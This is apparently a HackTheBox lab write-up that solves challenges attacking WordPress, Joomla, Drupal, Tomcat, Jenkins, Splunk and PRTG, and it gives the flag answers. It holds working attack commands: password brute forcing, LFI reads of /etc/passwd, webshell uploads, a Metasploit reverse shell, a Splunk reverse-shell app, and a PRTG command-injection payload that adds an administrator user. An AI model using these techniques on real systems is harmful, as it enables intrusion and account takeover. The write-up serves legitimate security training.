# HTB-Attacking_Common_Applications

## Table of Contents
0. [Tools](#tools)
1. [Setting the Stage](#setting-the-stage)
    1. [Application Discovery & Enumeration](#application-discovery--enumeration-1)
2. [Content Management Systems (CMS)](#content-management-systems-cms-1)
    1. [WordPress - Discovery & Enumeration](#wordpress---discovery--enumeration)
    2. [Attacking WordPress](#attacking-wordpress)
    3. [Joomla - Discovery & Enumeration](#joomla---discovery--enumeration)
    4. [Attacking Joomla](#attacking-joomla)
    5. [Drupal - Discovery & Enumeration](#drupal---discovery--enumeration)
    6. [Attacking Drupal](#attacking-drupal)
3. [Servlet Containers/Software Development](#servlet-containerssoftware-development-1)
    1. [Tomcat - Discovery & Enumeration](#tomcat---discovery--enumeration)
    2. [Attacking Tomcat](#attacking-tomcat)
    3. [Jenkins - Discovery & Enumeration](#jenkins---discovery--enumeration)
    4. [Attacking Jenkins](#attacking-jenkins)
4. [Infrastructure/Network Monitoring Tools](#infrastructurenetwork-monitoring-tools-1)
    1. [Splunk - Discovery & Enumeration](#splunk---discovery--enumeration)
    2. [Attacking Splunk](#attacking-splunk)
    3. [PRTG Network Monitor](#prtg-network-monitor)

## Tools
### Application Discovery & Enumeration
- Nmap
- eyewitness
- nessus
- aquatone
### Content Management Systems (CMS)
- wpscan
- [wpDiscuz.py](https://www.exploit-db.com/exploits/49967)
- droopescan
- [joomla-brute.py](https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py)
- [CVE-2019-10945.py](https://raw.githubusercontent.com/dpgg101/CVE-2019-10945/main/CVE-2019-10945.py)
- [drupalgeddon.py](https://www.exploit-db.com/exploits/34992)
### Servlet Containers/Software Development
- [cmd.jsp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
### Infrastructure/Network Monitoring Tools
- [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk.git)
- evil-winrm

## Setting the Stage
### Application Discovery & Enumeration
#### Challenges
1. Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)

    First, we need to set up our /etc/hosts file. We can do this by running the following command:

    ```bash
    IP=10.129.42.195
    printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local" | sudo tee -a /etc/hosts
    ```

    Because **eyewitness** tool requires .xml output from **nmap** tool, we need to run **nmap** first. We run **nmap** against all the hosts in our scope list.

    ```txt
    app.inlanefreight.local
    dev.inlanefreight.local
    drupal-dev.inlanefreight.local
    drupal-qa.inlanefreight.local
    drupal-acc.inlanefreight.local
    drupal.inlanefreight.local
    blog.inlanefreight.local
    ```

    ```bash
    sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
    ```
    Once we have our .xml file, we can run eyewitness to generate a report.

    ```bash
    eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
    ```

    The .db file will be in the inlanefreight_eyewitness folder. The answer is `ew.db`.

2. What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)

    Similar with eyewitness, aquatone requires .xml output from nmap. Once we have our .xml file, we can run aquatone to generate a report.

    ```bash
    cat web_discovery.xml | aquatone -nmap
    ```
    Once we have our report, we can open the aquatone_report.html page with a web browser. The answer is `Pages by Similarity`.


## Content Management Systems (CMS)
### WordPress - Discovery & Enumeration
#### Challenges
1. Enumerate the host and find a flag.txt flag in an accessible directory.

    We need to make sure that this host is running WordPress. We can do this by running the following command:

    ```bash
    curl -s http://blog.inlanefreight.local | grep WordPress
    ```

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 1.png>)

    We can see that this host is running WordPress. Then, we can use **wpscan**  to enumerate the host.

    ```bash
    sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <SNIP>
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 2.png>)

    We can see that upload directory is accessible in the **wp-content/uploads/** endpoint. We can visit it in our web browser and doing some exploration. The flag.txt is in the [http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt](http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt). The answer is `0ptions_ind3xeS_ftw!`.

2. Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).

    In the wpscan result, `Plugin(s) Identified:` section, it only shows two plugins. There are contact-form-7 and mail-masta. I tried read available plugins from the source code, by using **curl** command.

    ```bash
    curl -s http://blog.inlanefreight.local/ | grep plugins
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 3.png>)

    We can see that the output still same with wpscan result. So maybe we need to enumerate the other pages to find the hint. We can click the post section in the website. It will redirect us to another page. We can enumerate the plugins in the page.

    ```bash
    curl -s http://blog.inlanefreight.local/\?p\=1 | grep plugins
    ```

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 4.png>)

    We can see that there are more plugins in the page. The answer is `wp sitemap page`.

3. Find the version number of this plugin. (i.e., 4.5.2)

    The hint says that we need to find readme.txt file to get the plugin version. 

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 5.png>)

    The other plugin has readme.txt file in the under plugin directory. It looks like this,

    ```txt
    http://blog.inlanefreight.local/wp-content/plugins/<plugin_name>/readme.txt
    ```
    So maybe we can try to get the readme.txt file under wp-sitemap-page plugin.

    ```bash
    curl -s http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 6.png>)

    We can see that the version number from the output. The answer is `1.6.4`.

### Attacking WordPress
#### Challenges
1. Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?

    We can use **wpscan** to solve this.

    ```bash
    sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <SNIP>
    ```
    The answer is `doug`.

2. Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.

    We can use **wpscan** with `--multicall-max-passwords` and `-t` flag to increase the bruteforce speed.

    ```bash
    sudo wpscan --password-attack xmlrpc -t 100 --multicall-max-passwords 1000 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking WordPress - 1.png>)

    The answer is `jessica1`.

3. Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

    To solve this, we need to read **/etc/passwd** file to know which system user whose login shell is set to /bin/bash. We can accomplish this by using the vuln of **mail-masta** plugin. I have saved the wpscan enumeration output. 

    ![alt text](<Assets/Attacking WordPress - 2.png>)

    Based on that, **mail-masta** plugin has Local FIle Inclusion (LFI) vuln that make us can read files on the server without login.

    ```bash
    curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php\?pl\=/etc/passwd | grep /bin/bash
    ```

    ![alt text](<Assets/Attacking WordPress - 3.png>)
    
    The answer is `webadmin`.


4. Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

    In the previous plugin enumeration output, we can see that this website is using version 7.0.4 wpDiscuz plugin. This plugin has RCE vuln without authentication. We can use [this PoC](https://www.exploit-db.com/exploits/49967) to gain RCE.

    ```bash
    python3 wpDiscuz.py -u http://blog.inlanefreight.local -p /\?p\=1
    curl -s http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php\?cmd\=id
    ```

    ![alt text](<Assets/Attacking WordPress - 4.png>)

    We can execute the command by using curl. We can find the flag filename by using this and read it:

    ```bash
    curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php?cmd=ls%20/var/www/blog.inlanefreight.local/"

    curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php?cmd=cat%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
    ```

    The answer is `l00k_ma_unAuth_rc3!`.

### Joomla - Discovery & Enumeration
#### Challenges
1. Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)

    We can solve this by using **droopescan** tool to enumerate joomla.

    ```bash
    droopescan scan joomla --url http://app.inlanefreight.local
    ```
    The answer is `3.10.0`.

2. Find the password for the admin user on http://app.inlanefreight.local

    We can bruteforce by using this [script](https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py)

    ```bash
    sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
    ```
    The answer is `turnkey`.

### Attacking Joomla
#### Challenges
1. Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

    First, we need to enumerate the vhost.

    ```bash
    droopescan scan joomla --url http://dev.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking Joomla - 2.png>)

    Based on that, joomlah has vuln of **Directory Traversal / Authenticated Arbitrary File Deletion** for the **1.5.0 - 3.9.4** version. We can use this [script](https://github.com/dpgg101/CVE-2019-10945/blob/main/CVE-2019-10945.py) to exploit that vuln. But to use the script, we need to know the path of admin directory, username, and admin password. We can use **joomlascan.py** to find the admin directory.
    
    ```bash
    python2.7 joomlascan.py -u http://dev.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking Joomla - 1.png>)

    We can see that it has **/administrator** directory. Now, we need to find the username and admin password.

    ```bash
    sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
    ```
    The result is `admin:admin`. Now, we can use the script to exploit the vuln.

    ```bash
    python CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /  
    ``` 

    ![alt text](<Assets/Attacking Joomla - 3.png>)

    Then, we can use curl to read it.

    ```bash
    curl -s http://dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
    ```
    The answer is `j00mla_c0re_d1rtrav3rsal!`.

### Drupal - Discovery & Enumeration
#### Challenges
1. Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local

    We can use **droopescan** to enumerate Drupal.

    ```bash
    droopescan scan drupal -u http://drupal-qa.inlanefreight.local
    ```
    The answer is `7.30`.

### Attacking Drupal
#### Challenges
1. Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.

    Based on the enumeration result, http://drupal-qa.inlanefreight.local, is using Drupal with 7.30 version. This version has SQL Injection vuln. We can use **metasploit** with **multi/http/drupal_drupageddon** module to gain reverse shell.

    ```bash
    [msf](Jobs:0 Agents:0) >> use exploit/multi/http/drupal_drupageddon
    [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set lhost 10.10.14.101
    lhost => 10.10.14.101
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set rhosts 10.129.95.229
    rhosts => 10.129.95.229
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set vhost drupal-qa.inlanefreight.local
    vhost => drupal-qa.inlanefreight.local
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set payload php/reverse_php
    payload => php/reverse_php
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> exploit
    ```
    ![alt text](<Assets/Attacking Drupal - 1.png>)

    We can see that we have been successful getting shell session. Now, we can read the flag. The answer is `DrUp@l_drUp@l_3veryWh3Re!`.

## Servlet Containers/Software Development
### Tomcat - Discovery & Enumeration
#### Challenges
1. What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?

    We can solve this by visiting **/docs** from the default tomcat configuration. By default, **/docs** page will show the version of tomcat.

    ```bash
    curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat
    ```
    The answer is `10.0.10`.

2. What role does the admin user have in the configuration example?

    We can find this by reading `tomcat-users.xml` snipset code in the HTB module. The answer is `admin-gui`.

### Attacking Tomcat
#### Challenges
1. Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?

    We can use **metasploit** to bruteforce the username and password.

    ```bash
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set VHOST web01.inlanefreight.local
    VHOST => web01.inlanefreight.local
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set RPORT 8180
    RPORT => 8180
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set stop_on_success true
    stop_on_success => true
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts 10.129.230.35
    rhosts => 10.129.230.35
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
    ```
    ![alt text](<Assets/Attacking Tomcat - 1.png>)

    We can see that the valid username is `tomcat`.

2. What is the password?

    Based on the previous bruteforce attack, we can see that the valid password is `root`.

3. Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt

    Because we have the valid username and password, we can try to test it to login to the manager page (`http://web01.inlanefreight.local:8180/manager/html`). I have tried it and it works. So, we can try WAR File Upload to gain RCE. We can prepare the payload.

    ```bash
    wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
    zip -r backup.war cmd.jsp
    ```
    Then, we can upload the backup.war file. 

    ![alt text](<Assets/Attacking Tomcat - 2.png>)

    We can see that the file has been uploaded. Now, we can test it by using curl.

    ```bash
    curl http://web01.inlanefreight.local:8180/backup/cmd.jsp\?cmd\=id
    ```
    ![alt text](<Assets/Attacking Tomcat - 3.png>)

    We can see that id command is work. Now, we can search the flag file. After doing some exploration, the flag file is in `/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt` directory. We can read it by using curl.

    ```bash
    curl http://web01.inlanefreight.local:8180/backup/cmd.jsp\?cmd\=cat%20/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
    ```
    The answer is `t0mcat_rc3_ftw!`.
    
### Jenkins - Discovery & Enumeration
#### Challenges
1. Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on.

    We can login by the given credentials. After doing some exploration, we can find the jenkins version in the **/manage** endpoint.

    ![alt text](<Assets/Jenkins - Discovery & Enumeration - 1.png>)

    The answer is `2.303.1`.

### Attacking Jenkins
#### Challenges
1. Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory

    We can solve this by visiting **/script** endpoint to access script console. We can read the flag in there.

    ```groovy
    def cmd = 'cat /var/lib/jenkins3/flag.txt'
    def sout = new StringBuffer(), serr = new StringBuffer()
    def proc = cmd.execute()
    proc.consumeProcessOutput(sout, serr)
    proc.waitForOrKill(1000)
    println sout
    ```
    The answer is `f33ling_gr00000vy!`.

## Infrastructure/Network Monitoring Tools
### Splunk - Discovery & Enumeration
#### Challenges
1. Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).

    First, we can do enumeration by using nmap.

    ```bash
    sudo nmap -sV 10.129.91.145
    ```
    ![alt text](<Assets/Splunk - Discovery & Enumeration - 1.png>)

    Based on that, splunk is running in the port 8000 and 8089. We can try to visit port 8000.

    ![alt text](<Assets/Splunk - Discovery & Enumeration - 2.png>)

    We can see the splunk version in the tab. The answer is `8.2.2`.

### Attacking Splunk
#### Challenges
1. Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.

    We can use this [repository](https://github.com/0xjpuff/reverse_shell_splunk.git) to gain reverse shell. This repository contain several files.

    - bin/run.ps1   : This is the main script to gain reverse shell in windows target host.
    - bin/run.bat   : This file will run when the application is deployed and execute the PowerShell one-liner
    - bin/rev.py    : This is the main script to gain reverse shell in linux target host.
    - default/inputs.conf : This file will tell Splunk to execute which file and the condition.

    Because we the target host is windows, based on the nmap output, we need to edit `/bin/run.ps1` to change the IP address and port. Then, we can create a tarball.

    ```bash
    tar -cvzf updater.tar.gz reverse_shell_splunk
    ```
    Then, we can upload the file in the **https://10.129.91.145:8000/en-US/manager/search/apps/local** endpoint. But before we upload the tarball, we need to prepare the listener on our host.

    ```bash
    sudo nc -lnvp 443
    ```
    ![alt text](<Assets/Attacking Splunk - 1.png>)

    The answer is `l00k_ma_no_AutH!`.

### PRTG Network Monitor
#### Challenges
1. What version of PRTG is running on the target?

    In the [Splunk - Discovery & Enumeration](#splunk---discovery--enumeration) we had run nmap to enumerate the target host. We can see that PRTG version is `18.1.37.13946`.

2. Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.

    PRTG 18.1.37.13946 has Command Injection Vulnerability. When we add notification, in the parameter of execute program section, the parameter field will be passed to the powershell without sanitazion and executed it with SYSTEM level. We can use this vuln to add user and grant them Administrator role. So to do this, we need to login to the PRTG page (http://10.129.91.145:8080). We can use the same credential like in the module, `prtgadmin:Password123`. Once we have logged in, we can go to setup -> Account Settings -> Notifications -> Add Notification. Then, we can fill the field like this:

    ![alt text](<Assets/PRTG Network Monitor - 1.png>)

    ![alt text](<Assets/PRTG Network Monitor - 2.png>)

    We used this payload in the parameter section.

    ```txt
    test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
    ```
    After that, click save and run notification test. Then, we can test to login by using `evil-winrm`.

    ```bash
    evil-winrm -i 10.129.91.145 -u prtgadm1 -p 'Pwn3d_by_PRTG!'
    ```
    ![alt text](<Assets/PRTG Network Monitor - 3.png>)

    The answer is `WhOs3_m0nit0ring_wH0?`.